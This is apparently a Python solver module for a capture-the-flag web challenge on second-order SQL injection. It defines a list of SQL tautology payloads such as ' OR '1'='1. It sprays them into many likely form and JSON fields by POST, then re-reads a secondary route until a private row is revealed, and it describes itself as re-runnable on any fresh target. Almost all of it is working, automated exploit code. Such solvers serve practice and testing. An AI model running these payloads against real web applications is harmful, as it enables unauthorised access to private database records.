"""D23 "Ask Again Later" (web-exploitation-day-12-ask-again-later): second-order SQL injection.

Kit shape: /api/clues = {framework, feature_route, secondary_route, current_role}; GET feature_route -> 405
{"error":"post_required"}; POST feature_route (any body) -> {"ok":true,"saved":true} stores the field; GET
secondary_route later runs the stored value inside a quoted SQL literal and returns {"rows":[...],"effect":
"delayed_query_revealed_private_row"}. A quote-balanced tautology (`' OR '1'='1`) in `name` surfaces the private
row (the proof); a `--`-comment payload does NOT (measured TT). Plant the ladder in every likely field at once (form,
then JSON), re-read the secondary route after each plant. Re-runnable on any fresh target.
"""
import json
import re
import urllib.parse

from lib import websolve

FIELDS = ("name", "query", "title", "label", "filter", "note", "search", "q", "value", "term", "report")
PAYLOADS = ("' OR '1'='1", "') OR ('1'='1", "x' OR 1=1 OR 'a'='b", "1 OR 1=1", "zz' OR 1=1 --")


def _route(cl, *pats):
    for p in pats:
        for k, v in cl.items():
            if re.search(p, k, re.I) and isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v):
                return v
    return None


def second_order(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    plant = _route(cl, r"feature|submit")
    read = _route(cl, r"secondary|result|internal|report")
    if not plant or not read or plant == read:
        return None
    read_url, plant_url = urllib.parse.urljoin(base, read), urllib.parse.urljoin(base, plant)
    st, body, _ = websolve.fetch(read_url)
    p = websolve.proof(body)
    if p:
        return p
    if not re.search(r'"rows"|delayed|query', body or "", re.I):
        return None   # not a delayed-query reader
    for pay in PAYLOADS:
        form = {f: pay for f in FIELDS}
        for data, hdrs in ((form, None),
                           (json.dumps(form).encode(), {"Content-Type": "application/json"})):
            st, body, _ = websolve.fetch(plant_url, hdrs, data=data, method="POST")
            p = websolve.proof(body)
            if p:
                return p
            if not 200 <= st < 300:
                continue
            p = websolve.proof(websolve.fetch(read_url)[1])
            if p:
                return p
    return None


KEY_MAP = [(r"secondary_route|delayed|second_order|result_route", "day23_web_ask_again_later")]
HANDLERS = {"day23_web_ask_again_later": second_order}
